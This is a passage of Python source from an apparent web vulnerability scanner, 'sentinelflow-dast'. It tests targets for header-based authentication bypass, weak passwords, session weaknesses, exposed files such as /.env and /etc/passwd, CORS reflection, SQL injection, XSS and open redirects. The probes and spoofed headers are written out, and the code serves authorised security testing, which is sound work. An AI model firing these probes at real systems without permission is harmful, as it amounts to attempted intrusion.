                                "cvss_score": 9.1, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(f)
                            log_finding(logger, "critical", f["title"], {"url": base_url})
                            findings.append(f)
        except Exception:
            pass
        return findings

    async def _test_authentication_bypass(self, base_url, service_id, scan_id):
        """Test for authentication bypass techniques."""
        findings = []
        from urllib.parse import urljoin
        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
        ]
        protected_paths = ["/admin", "/admin/", "/dashboard", "/api/admin", "/management"]
        for path in protected_paths[:3]:
            url = urljoin(base_url, path)
            try:
                async with create_session(self.config) as session:
                    # Get baseline (should be 401/403)
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=False) as resp:
                        if resp.status not in (401, 403, 302):
                            continue
                        baseline_status = resp.status
                    # Try bypass headers
                    for headers in bypass_headers:
                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=False) as resp:
                            if resp.status == 200 and baseline_status in (401, 403):
                                f = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": url, "phase": "dast",
                                    "severity": "critical", "category": "auth_bypass",
                                    "title": f"Authentication Bypass via {list(headers.keys())[0]}",
                                    "description": f"Adding header `{list(headers.keys())[0]}: {list(headers.values())[0]}` bypasses authentication on `{path}`.",
                                    "evidence": f"Baseline: HTTP {baseline_status}\nWith bypass header: HTTP {resp.status}",
                                    "remediation": "Never trust client-supplied IP headers for access control. Implement server-side authentication.",
                                    "cvss_score": 9.8, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(f)
                                log_finding(logger, "critical", f["title"], {"url": url})
                                findings.append(f)
                                return findings
            except Exception:
                pass
        return findings

    async def _test_tls_security(self, base_url, service_id, scan_id):
        """Check TLS/SSL configuration."""
        findings = []
        import ssl, socket
        from urllib.parse import urlparse
        parsed = urlparse(base_url)
        if parsed.scheme != "https":
            return []
        hostname = parsed.hostname
        port = parsed.port or 443
        try:
            # Check for expired/self-signed cert
            ctx = ssl.create_default_context()
            loop = __import__("asyncio").get_event_loop()
            def check_cert():
                try:
                    with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                        s.settimeout(10)
                        s.connect((hostname, port))
                        cert = s.getpeercert()
                        return cert, None
                except ssl.SSLCertVerificationError as e:
                    return None, str(e)
                except Exception as e:
                    return None, str(e)
            cert, err = await loop.run_in_executor(None, check_cert)
            if err:
                f = {
                    "scan_id": scan_id, "service_id": service_id,
                    "url": base_url, "phase": "dast",
                    "severity": "high", "category": "tls_issue",
                    "title": "TLS Certificate Issue",
                    "description": f"TLS certificate validation failed: {err}",
                    "evidence": f"Error: {err}",
                    "remediation": "Use a valid certificate from a trusted CA. Ensure certificate is not expired.",
                    "cvss_score": 7.5, "tool": "sentinelflow-dast",
                }
                await self.db.insert_finding(f)
                findings.append(f)
            elif cert:
                import datetime
                expiry_str = cert.get("notAfter", "")
                if expiry_str:
                    expiry = datetime.datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
                    days_left = (expiry - datetime.datetime.now()).days
                    if days_left < 30:
                        sev = "critical" if days_left < 0 else "high"
                        f = {
                            "scan_id": scan_id, "service_id": service_id,
                            "url": base_url, "phase": "dast",
                            "severity": sev, "category": "tls_expiry",
                            "title": f"TLS Certificate {'Expired' if days_left < 0 else 'Expiring Soon'}: {days_left} days",
                            "description": f"Certificate {'expired {abs(days_left)} days ago' if days_left < 0 else f'expires in {days_left} days'}.",
                            "evidence": f"NotAfter: {expiry_str}",
                            "remediation": "Renew the TLS certificate immediately.",
                            "cvss_score": 7.5, "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(f)
                        log_finding(logger, sev, f["title"], {"url": base_url})
                        findings.append(f)
        except Exception:
            pass
        return findings

    async def _test_password_policy(self, base_url, service_id, scan_id):
        """Test for weak password policy on registration/change forms."""
        findings = []
        from urllib.parse import urljoin
        reg_paths = ["/register", "/signup", "/create-account", "/api/register", "/api/users"]
        WEAK_PASSWORDS = ["123456", "password", "abc", "1", "aa", "test"]
        for path in reg_paths[:4]:
            url = urljoin(base_url, path)
            try:
                async with create_session(self.config) as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                        if resp.status not in (200, 301, 302):
                            continue
                    for weak_pass in WEAK_PASSWORDS[:3]:
                        async with session.post(url,
                            data={"username": "testuser123", "password": weak_pass, "email": "test@test.com"},
                            timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=False) as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status in (200, 201, 302) and not any(kw in body.lower() for kw in ["too short","too weak","invalid","minimum","at least","strength"]):
                                f = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": url, "phase": "dast",
                                    "severity": "medium", "category": "weak_password_policy",
                                    "title": f"Weak Password Accepted: '{weak_pass}'",
                                    "description": f"Registration/API at `{path}` accepted weak password '{weak_pass}' without rejection.",
                                    "evidence": f"Password: {weak_pass}\nHTTP {resp.status}\n{body[:200]}",
                                    "remediation": "Enforce minimum 8 chars, mixed case, numbers, special chars. Use zxcvbn or similar strength checker.",
                                    "cvss_score": 5.3, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(f)
                                findings.append(f)
                                return findings
            except Exception:
                pass
        return findings

    async def _test_session_security(self, base_url, service_id, scan_id):
        """Test for session management weaknesses."""
        findings = []
        try:
            async with create_session(self.config) as session:
                # Get session cookies
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                    for header, value in resp.headers.items():
                        if header.lower() != "set-cookie":
                            continue
                        # Check for predictable session IDs
                        import re as _re
                        session_match = _re.search(r'(?:session|sess|PHPSESSID|JSESSIONID|ASP\.NET_SessionId)=([^;]+)', value, _re.IGNORECASE)
                        if session_match:
                            sess_val = session_match.group(1)
                            # Check if too short or predictable
                            if len(sess_val) < 16:
                                f = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": base_url, "phase": "dast",
                                    "severity": "high", "category": "session_weakness",
                                    "title": f"Weak Session ID: Only {len(sess_val)} chars",
                                    "description": f"Session ID is only {len(sess_val)} characters. Short session IDs are vulnerable to brute force.",
                                    "evidence": f"Session cookie: {sess_val[:20]}...",
                                    "remediation": "Use cryptographically random session IDs of at least 128 bits. Use framework-provided session management.",
                                    "cvss_score": 6.5, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(f)
                                findings.append(f)
                            if sess_val.isdigit():
                                f = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": base_url, "phase": "dast",
                                    "severity": "critical", "category": "session_weakness",
                                    "title": "Numeric Session ID — Highly Predictable",
                                    "description": "Session ID is purely numeric. Trivially brute-forceable.",
                                    "evidence": f"Session value: {sess_val[:20]}",
                                    "remediation": "Use cryptographically random session tokens (UUID v4 or stronger).",
                                    "cvss_score": 8.1, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(f)
                                log_finding(logger, "critical", f["title"], {"url": base_url})
                                findings.append(f)
        except Exception:
            pass
        return findings

    async def _check_admin_paths(self, base_url: str, service_id: int, scan_id: int) -> list:
        """Check for exposed admin panels and sensitive paths."""
        findings = []
        from urllib.parse import urljoin

        semaphore = __import__('asyncio').Semaphore(20)

        async def check_path(path):
            async with semaphore:
                await self.rate_limiter.acquire()
                url = urljoin(base_url.rstrip('/') + '/', path.lstrip('/'))
                try:
                    async with create_session(self.config) as session:
                        async with session.get(
                            url,
                            timeout=aiohttp.ClientTimeout(total=8),
                            ssl=False,
                            allow_redirects=False,
                        ) as resp:
                            if resp.status in (200, 206, 301, 302, 403, 401):
                                body = await resp.text(errors='ignore')
                                content_len = len(body)

                                # Determine severity
                                if path in ('/.env', '/.git/config', '/web.config', '//etc/passwd'):
                                    if resp.status == 200 and content_len > 20:
                                        sev = "critical"
                                    else:
                                        return None
                                elif resp.status in (200, 206):
                                    if any(kw in path for kw in ['/admin', '/phpmyadmin', '/console', '/actuator']):
                                        sev = "high"
                                    elif any(kw in path for kw in ['/login', '/dashboard', '/panel', '/api/']):
                                        sev = "medium"
                                    elif path in ('/phpinfo.php', '/info.php', '/server-status', '/debug'):
                                        sev = "high"
                                    else:
                                        sev = "medium"
                                elif resp.status == 403:
                                    sev = "low"  # Exists but blocked
                                elif resp.status == 401:
                                    sev = "medium"  # Auth required = exists
                                else:
                                    return None

                                finding = {
                                    "scan_id": scan_id,
                                    "service_id": service_id,
                                    "url": url,
                                    "phase": "dast",
                                    "severity": sev,
                                    "category": "exposed_panel" if 'admin' in path or 'login' in path else "exposed_file",
                                    "title": f"Exposed Path [{resp.status}]: {path}",
                                    "description": (
                                        f"Path `{path}` returned HTTP {resp.status}. "
                                        f"{'This endpoint is publicly accessible.' if resp.status == 200 else 'This endpoint exists (auth required/forbidden).'} "
                                        f"Response size: {content_len} bytes."
                                    ),
                                    "evidence": f"GET {url} → HTTP {resp.status}\n{body[:200]}",
                                    "remediation": f"Restrict access to {path}. Ensure admin interfaces require strong authentication and are IP-whitelisted.",
                                    "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, sev, finding["title"], {"url": url, "status": resp.status})
                                return finding
                except Exception:
                    pass
            return None

        import asyncio
        tasks = [check_path(p) for p in ADMIN_PATHS]
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        findings = [r for r in results_list if r and isinstance(r, dict)]
        if findings:
            logger.info(f"[DAST] Admin path scan: {len(findings)} paths found on {base_url}")
        return findings

    # ─── Security Headers ──────────────────────────────────────────────────

    async def _check_security_headers(
        self, url: str, service_id: int, scan_id: int
    ) -> List[Dict]:
        """Check for missing or misconfigured security headers."""
        findings = []

        async with create_session(self.config) as session:
            try:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                    allow_redirects=True,
                ) as resp:
                    headers = resp.headers

                    # Check missing security headers
                    for header_name, meta in SECURITY_HEADERS.items():
                        if header_name not in headers:
                            finding = {
                                "scan_id": scan_id,
                                "service_id": service_id,
                                "url": url,
                                "phase": "dast",
                                "severity": meta["severity"],
                                "category": "missing_security_header",
                                "title": f"Missing Security Header: {header_name}",
                                "description": meta["description"],
                                "evidence": f"Header '{header_name}' not present in response",
                                "remediation": meta["remediation"],
                                "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(finding)
                            findings.append(finding)

                    # Check for information disclosure in headers
                    server = headers.get("Server", "")
                    if server and re.search(r"\d+\.\d+", server):
                        finding = {
                            "scan_id": scan_id,
                            "service_id": service_id,
                            "url": url,
                            "phase": "dast",
                            "severity": "low",
                            "category": "information_disclosure",
                            "title": f"Server Version Disclosure: {server}",
                            "description": "Server header reveals software version, aiding fingerprinting.",
                            "evidence": f"Server: {server}",
                            "remediation": "Remove or genericize the Server header in web server config.",
                            "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(finding)
                        findings.append(finding)

                    # CORS misconfiguration check
                    cors_findings = await self._check_cors(url, resp.headers, service_id, scan_id)
                    findings.extend(cors_findings)

            except Exception as e:
                logger.debug(f"Header check error for {url}: {e}")

        return findings

    async def _check_cors(
        self, url: str, headers: dict, service_id: int, scan_id: int
    ) -> List[Dict]:
        """Test for CORS misconfiguration."""
        findings = []
        async with create_session(self.config) as session:
            try:
                test_headers = {"Origin": "https://evil-attacker.com"}
                async with session.get(
                    url,
                    headers=test_headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                ) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == "*" and "true" in acac.lower():
                        finding = {
                            "scan_id": scan_id,
                            "service_id": service_id,
                            "url": url,
                            "phase": "dast",
                            "severity": "high",
                            "category": "cors_misconfiguration",
                            "title": "CORS Misconfiguration: Wildcard with Credentials",
                            "description": (
                                "CORS is configured to allow all origins with credentials. "
                                "This allows any website to make credentialed requests on behalf of users."
                            ),
                            "evidence": f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                            "remediation": "Specify explicit allowed origins. Never combine wildcard ACAO with Allow-Credentials.",
                            "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(finding)
                        log_finding(logger, "high", finding["title"], {"url": url})
                        findings.append(finding)

                    elif acao == "https://evil-attacker.com":
                        finding = {
                            "scan_id": scan_id,
                            "service_id": service_id,
                            "url": url,
                            "phase": "dast",
                            "severity": "high",
                            "category": "cors_misconfiguration",
                            "title": "CORS: Arbitrary Origin Reflected",
                            "description": "Server reflects arbitrary Origin values in CORS response.",
                            "evidence": f"Sent Origin: https://evil-attacker.com\nGot: {acao}",
                            "remediation": "Implement strict origin allowlist validation.",
                            "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(finding)
                        log_finding(logger, "high", finding["title"], {"url": url})
                        findings.append(finding)

            except Exception:
                pass

        return findings

    # ─── Endpoint Discovery ────────────────────────────────────────────────

    async def _discover_endpoints(
        self, base_url: str, domain: str, service_id: int
    ) -> List[Dict]:
        """Discover endpoints with dedup, caps, and param prioritization."""
        endpoints = []
        seen = set()

        # 1. Wayback Machine (capped at 50)
        wayback_endpoints = await self._wayback_endpoints(domain)
        for ep in wayback_endpoints[:50]:
            key = f"{ep.get('url')}:{ep.get('method','GET')}"
            if key not in seen:
                seen.add(key)
                endpoints.append(ep)

        # 2. Crawl links (depth-limited)
        crawl_endpoints = await self._crawl_links(base_url)
        for ep in crawl_endpoints:
            key = f"{ep.get('url')}:{ep.get('method','GET')}"
            if key not in seen:
                seen.add(key)
                endpoints.append(ep)
            if len(endpoints) >= getattr(self, "MAX_ENDPOINTS", 150):
                break

        # 3. Prioritize: params first, no-param capped at 20
        with_params    = [e for e in endpoints if e.get("params")]
        without_params = [e for e in endpoints if not e.get("params")][:20]
        final = with_params + without_params

        logger.info(f"[DAST] Discovered {len(final)} unique endpoints, {len(with_params)} with parameters")
        return final


    async def _wayback_endpoints(self, domain: str) -> List[Dict]:
        """Pull historical URLs from the Wayback Machine CDX API."""
        endpoints = []
        cdx_url = (
            f"http://web.archive.org/cdx/search/cdx?"
            f"url=*.{domain}&output=json&fl=original&collapse=urlkey&limit=500"
        )

        async with create_session(self.config) as session:
            try:
                async with session.get(
                    cdx_url, timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        for row in data[1:]:  # Skip header row
                            url = row[0] if row else ""
                            if url and "?" in url:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query)
                                endpoints.append({
                                    "url": url,
                                    "method": "GET",
                                    "params": params,
                                    "source": "wayback",
                                })
            except Exception as e:
                logger.debug(f"Wayback Machine error: {e}")

        return endpoints

    async def _crawl_links(self, base_url: str) -> List[Dict]:
        """Extract links from a page."""
        endpoints = []
        async with create_session(self.config) as session:
            try:
                async with session.get(
                    base_url,
                    timeout=aiohttp.ClientTimeout(total=15),
                    ssl=False,
                ) as resp:
                    body = await resp.text(errors="ignore")

                    # href links
                    for match in re.finditer(r'href=["\']([^"\']+)["\']', body):
                        href = match.group(1)
                        if href.startswith("/") or href.startswith(base_url):
                            full = urljoin(base_url, href)
                            if "?" in full:
                                parsed = urlparse(full)
                                params = parse_qs(parsed.query)
                                endpoints.append({
                                    "url": full,
                                    "method": "GET",
                                    "params": params,
                                    "source": "crawl",
                                })

                    # Form actions
                    for match in re.finditer(
                        r'<form[^>]+action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']',
                        body, re.IGNORECASE
                    ):
                        action = urljoin(base_url, match.group(1))
                        method = match.group(2).upper()
                        # Extract form inputs
                        form_inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body)
                        endpoints.append({
                            "url": action,
                            "method": method,
                            "params": {k: ["test"] for k in form_inputs},
                            "source": "form_crawl",
                        })

            except Exception as e:
                logger.debug(f"Crawl error: {e}")

        return endpoints

    # ─── SQLi Testing ──────────────────────────────────────────────────────


    def _normalize_url(self, url: str) -> str:
        from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
        try:
            p = urlparse(url.lower().rstrip("/"))
            q = parse_qs(p.query, keep_blank_values=True)
            sq = urlencode(sorted(q.items()), doseq=True)
            return urlunparse((p.scheme, p.netloc, p.path, "", sq, ""))
        except Exception:
            return url

    def _is_new_finding(self, category: str, url: str, param: str = "") -> bool:
        if not hasattr(self, "_finding_count"):
            self._seen_findings = set()
            self._finding_count = 0
            self.MAX_FINDINGS = 200
        if self._finding_count >= self.MAX_FINDINGS:
            return False
        try:
            from urllib.parse import urlparse
            p = urlparse(url)
            base = p.netloc + p.path
        except Exception:
            base = url
        key = (category, base, param)
        if key in self._seen_findings:
            return False
        self._seen_findings.add(key)
        self._finding_count += 1
        return True

    async def _test_sqli(
        self, endpoint: Dict, service_id: int, scan_id: int
    ) -> List[Dict]:
        """Test an endpoint for SQL injection - error-based and boolean-based."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        method = endpoint.get("method", "GET")

        if not params:
            return []

        # Get baseline response first
        baseline_body = ""
        baseline_len = 0
        try:
            async with create_session(self.config) as session:
                async with session.get(
                    url, timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False, allow_redirects=True,
                ) as resp:
                    baseline_body = await resp.text(errors="ignore")
                    baseline_len = len(baseline_body)
                    baseline_status = resp.status
        except Exception:
            pass

        for param_name in list(params.keys())[:10]:
            param_found = False
            for payload in SQLI_DETECTION_PAYLOADS[:15]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)

                try:
                    async with create_session(self.config) as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False,
                            allow_redirects=True,
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            status = resp.status

                            # Check 1: Error-based detection
                            db_type, matched_sig = self._detect_sqli_error(body)
                            if db_type:
                                finding = {
                                    "scan_id": scan_id,
                                    "service_id": service_id,
                                    "url": test_url,
                                    "phase": "dast",
                                    "severity": "critical",
                                    "category": "sql_injection",
                                    "title": f"SQL Injection (Error-Based): {param_name} [{db_type}]",
                                    "description": (
                                        f"Parameter `{param_name}` triggers SQL errors from {db_type}. "
                                        "Direct database error messages confirm injectable input."
                                    ),
                                    "evidence": f"Payload: {payload}\nDB: {db_type}\nSignature: {matched_sig}\n\n{body[:400]}",
                                    "remediation": "Use parameterized queries. Never concatenate user input into SQL.",
                                    "cvss_score": 9.8,
                                    "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "critical", finding["title"], {"url": url, "param": param_name})
                                findings.append(finding)
                                param_found = True
                                break

                            # Check 2: Boolean-based - significant response difference
                            if baseline_len > 0 and payload in ("1 AND 1=1", "1 AND 1=2"):
                                len_diff = abs(len(body) - baseline_len)
                                if len_diff > 500 or (status != baseline_status and baseline_status != 0):
                                    finding = {
                                        "scan_id": scan_id,
                                        "service_id": service_id,
                                        "url": test_url,
                                        "phase": "dast",
                                        "severity": "high",
                                        "category": "sql_injection",
                                        "title": f"SQL Injection (Boolean-Based): {param_name}",
                                        "description": (
                                            f"Parameter `{param_name}` shows different responses for true/false SQL conditions. "
                                            f"Response length changed by {len_diff} bytes — indicates boolean-based blind SQLi."
                                        ),
                                        "evidence": f"Baseline: {baseline_len} bytes\nWith payload '{payload}': {len(body)} bytes\nDiff: {len_diff}",
                                        "remediation": "Use parameterized queries. Never interpolate user input into SQL.",
                                        "cvss_score": 8.8,
                                        "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "high", finding["title"], {"url": url, "param": param_name})
                                    findings.append(finding)
                                    param_found = True
                                    break

                            # Check 3: 500 error on injection attempt (generic)
                            if status == 500 and baseline_status != 500:
                                finding = {
                                    "scan_id": scan_id,
                                    "service_id": service_id,
                                    "url": test_url,
                                    "phase": "dast",
                                    "severity": "high",
                                    "category": "sql_injection",
                                    "title": f"Possible SQL Injection (500 Error): {param_name}",
                                    "description": (
                                        f"Parameter `{param_name}` causes HTTP 500 error with SQL payload '{payload}'. "
                                        "Server errors triggered by injection payloads often indicate unhandled SQL exceptions."
                                    ),
                                    "evidence": f"Payload: {payload}\nResponse: HTTP 500\n{body[:300]}",
                                    "remediation": "Investigate server-side error handling. Use parameterized queries.",
                                    "cvss_score": 7.5,
                                    "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "high", finding["title"], {"url": url, "param": param_name})
                                findings.append(finding)
                                param_found = True
                                break

                except Exception:
                    pass

            if param_found:
                continue

        return findings

    def _detect_sqli_error(self, body: str) -> tuple:
        body_lower = body.lower()

        for db_type, signatures in SQLI_ERROR_SIGNATURES.items():
            for sig in signatures:
                if re.search(sig, body, re.IGNORECASE):
                    return db_type, sig

        generic = [
            "sql syntax",
            "mysql_fetch",
            "ora-",
            "postgresql",
            "sqlite_",
            "jdbc",
            "odbc",
            "db error",
            "database error",
            "query failed",
            "sql error",
            "syntax error",
            "unclosed quotation",
            "invalid query",
        ]

        for g in generic:
            if g in body_lower:
                return "generic", g

        return None, None

    # ─── XSS Testing ───────────────────────────────────────────────────────

    async def _test_xss(
        self, endpoint: Dict, service_id: int, scan_id: int
    ) -> List[Dict]:
        """Test for reflected XSS - both GET params and POST forms."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        method = endpoint.get("method", "GET")

        if not params:
            return []

        for param_name in list(params.keys())[:10]:
            param_found = False
            for payload in XSS_PAYLOADS[:12]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]

                try:
                    async with create_session(self.config) as session:
                        if method == "POST":
                            flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                            resp_ctx = session.post(
                                url, data=flat_params,
                                timeout=aiohttp.ClientTimeout(total=10),
                                ssl=False, allow_redirects=True,
                            )
                        else:
                            test_url = self._rebuild_url(url, test_params)
                            resp_ctx = session.get(
                                test_url,
                                timeout=aiohttp.ClientTimeout(total=10),
                                ssl=False, allow_redirects=True,
                            )

                        async with resp_ctx as resp:
                            body = await resp.text(errors="ignore")
                            ctype = resp.headers.get("Content-Type", "")

                            # Check both HTML and JS responses
                            if "html" not in ctype.lower() and "javascript" not in ctype.lower():
                                # Still check if payload appears verbatim
                                if payload not in body:
                                    continue

                            # Check for reflection
                            reflected = False
                            matched_pattern = ""

                            # Direct reflection check (most reliable)
                            for p in XSS_PAYLOADS[:12]:
                                if p in body and p == payload:
                                    reflected = True
                                    matched_pattern = f"Direct reflection of: {payload}"
                                    break

                            # Pattern-based check
                            if not reflected:
                                for pattern in XSS_REFLECTION_PATTERNS:
                                    if re.search(pattern, body, re.IGNORECASE):
                                        reflected = True
                                        matched_pattern = pattern
                                        break

                            if reflected:
                                final_url = self._rebuild_url(url, test_params) if method == "GET" else url
                                finding = {
                                    "scan_id": scan_id,
                                    "service_id": service_id,
                                    "url": final_url,
                                    "phase": "dast",
                                    "severity": "high",
                                    "category": "cross_site_scripting",
                                    "title": f"Reflected XSS: {param_name} ({method})",
                                    "description": (
                                        f"Parameter `{param_name}` ({method}) reflects unsanitized input in the response. "
                                        "Attackers can inject JavaScript to steal cookies, hijack sessions, or deface pages."
                                    ),
                                    "evidence": f"Payload: {payload}\nReflection: {matched_pattern}\nContext: {body[max(0,body.find(payload)-100):body.find(payload)+200]}",
                                    "remediation": (
                                        "HTML-encode output using htmlspecialchars() or equivalent. "
                                        "Implement Content-Security-Policy header. "
                                        "Use framework auto-escaping (e.g. Jinja2, React JSX)."
                                    ),
                                    "cvss_score": 6.1,
                                    "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "high", finding["title"], {"url": url, "param": param_name, "method": method})
                                findings.append(finding)
                                param_found = True
                                break
                except Exception:
                    pass

            if param_found:
                continue

        return findings

    # ─── Open Redirect ─────────────────────────────────────────────────────

    async def _test_open_redirect(
        self, endpoint: Dict, service_id: int, scan_id: int
    ) -> List[Dict]:
        """Test for open redirect vulnerabilities."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})

        # Look for redirect-related parameters
        redirect_params = [
            k for k in params.keys()
            if any(kw in k.lower() for kw in [
                "redirect", "return", "next", "url", "goto", "redir",
                "destination", "target", "location", "forward"
            ])
        ]

        for param_name in redirect_params:
            for payload in OPEN_REDIRECT_PAYLOADS:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)

                async with create_session(self.config) as session:
                    try:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False,
                            allow_redirects=False,
                        ) as resp:
                            if resp.status in (301, 302, 303, 307, 308):
                                location = resp.headers.get("Location", "")
                                if "evil-attacker.com" in location or "evil.com" in location:
                                    finding = {
                                        "scan_id": scan_id,
                                        "service_id": service_id,
                                        "url": test_url,
                                        "phase": "dast",
                                        "severity": "medium",
                                        "category": "open_redirect",
                                        "title": f"Open Redirect: {param_name} parameter",
                                        "description": (
                                            f"The parameter `{param_name}` accepts arbitrary redirect URLs. "
                                            "Attackers can use this for phishing by redirecting users "
                                            "to malicious sites while abusing the trusted domain."
                                        ),
                                        "evidence": f"Payload: {payload}\nRedirects to: {location}",
                                        "remediation": (
                                            "Implement a strict allowlist of redirect destinations. "
                                            "Validate redirect URLs against expected patterns."
                                        ),
                                        "tool": "sentinelflow-dast",
                                    }
                                    await self.db.insert_finding(finding)
                                    log_finding(logger, "medium", finding["title"], {"url": url})
                                    findings.append(finding)
                                    break
                    except Exception:
                        pass

        return findings

    # ─── Nuclei Integration ────────────────────────────────────────────────

    async def _run_nuclei(self, urls: List[str], scan_id: int) -> List[Dict]:
        """Run Nuclei for CVE and misconfiguration template scanning."""
        findings = []
        if not urls:
            return findings

        # Write URLs to temp file
        targets_file = "/tmp/sentinelflow_nuclei_targets.txt"
        with open(targets_file, "w") as f:
            f.write("\n".join(urls))

        output_file = "/tmp/sentinelflow_nuclei_output.json"

        # Build severity filter
        severity_filter = ",".join(self.config.severity_levels)

        cmd = [
            self.config.nuclei_path,
            "-l", targets_file,
            "-json",
            "-o", output_file,
            "-severity", severity_filter,
            "-silent",
            "-rate-limit", str(min(self.config.rate_limit, 100)),
            "-timeout", str(self.config.timeout),
            "-retries", "1",
        ]

        # Use custom templates if specified
        if self.config.nuclei_templates:
            cmd.extend(["-t", self.config.nuclei_templates])

        try:
            logger.info(f"[Nuclei] Scanning {len(urls)} targets...")
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await asyncio.wait_for(proc.communicate(), timeout=600)

            if os.path.exists(output_file):
                with open(output_file) as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            result = json.loads(line)
                            finding = self._nuclei_to_finding(result, scan_id)
                            if finding:
                                await self.db.insert_finding(finding)
                                log_finding(
                                    logger,
                                    finding["severity"],
                                    finding["title"],
                                    {"url": finding.get("url"), "template": result.get("template-id")}
                                )
                                findings.append(finding)
                        except json.JSONDecodeError:
                            continue
                os.remove(output_file)

            if os.path.exists(targets_file):
                os.remove(targets_file)

            logger.info(f"[Nuclei] Found {len(findings)} findings")
        except asyncio.TimeoutError:
            logger.warning("[Nuclei] Scan timed out after 600s")
        except Exception as e:
            logger.warning(f"[Nuclei] Error: {e}")

        return findings

    def _nuclei_to_finding(self, result: Dict, scan_id: int) -> Optional[Dict]:
        """Convert a Nuclei JSON result to a SentinelFlow finding."""
        info = result.get("info", {})
        severity = info.get("severity", "info").lower()

        if severity not in self.config.severity_levels:
            return None

        # Map CVSSv3 scores
        cvss_score = None
        classification = info.get("classification", {})
        if classification:
            cvss_score = classification.get("cvss-score")

        cve_ids = classification.get("cve-id", [])
        cve_id = cve_ids[0] if cve_ids else None

        return {
            "scan_id": scan_id,
            "service_id": None,
            "url": result.get("matched-at", result.get("host", "")),
            "phase": "dast",
            "severity": severity,
            "category": result.get("type", "nuclei"),
            "title": info.get("name", result.get("template-id", "Unknown")),
            "description": info.get("description", ""),
            "evidence": result.get("extracted-results", [""])[0] if result.get("extracted-results") else "",
            "remediation": info.get("remediation", "Refer to the CVE advisory for remediation guidance."),
            "cvss_score": cvss_score,
            "cve_id": cve_id,
            "tool": "nuclei",
            "template": result.get("template-id"),
        }

    # ─── Helpers ───────────────────────────────────────────────────────────

    def _rebuild_url(self, url: str, params: Dict) -> str:
        """Rebuild a URL with modified query parameters."""
        parsed = urlparse(url)
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_query = urlencode(flat_params)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
